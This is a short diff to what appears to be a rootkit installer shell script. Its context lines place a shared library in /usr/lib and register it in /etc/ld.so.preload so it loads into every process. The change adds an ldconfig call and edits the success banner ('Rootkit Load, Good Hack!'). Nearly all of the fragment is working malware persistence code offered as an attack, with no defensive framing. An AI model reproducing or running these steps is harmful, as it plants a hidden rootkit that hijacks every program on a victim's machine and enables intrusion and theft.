@@ -19,11 +19,12 @@ mv _libc.so /usr/lib
 
 #LD_PRELOAD
 echo "/usr/lib/_libc.so" >> /etc/ld.so.preload
+ldconfig
 
 #clear screen
 $(clear)
 
-echo "[!] Rootkit Load, Good Hack!"
+echo "[!] Rootkit Load, Good Hack! Open New Terminal."
 
 else
 
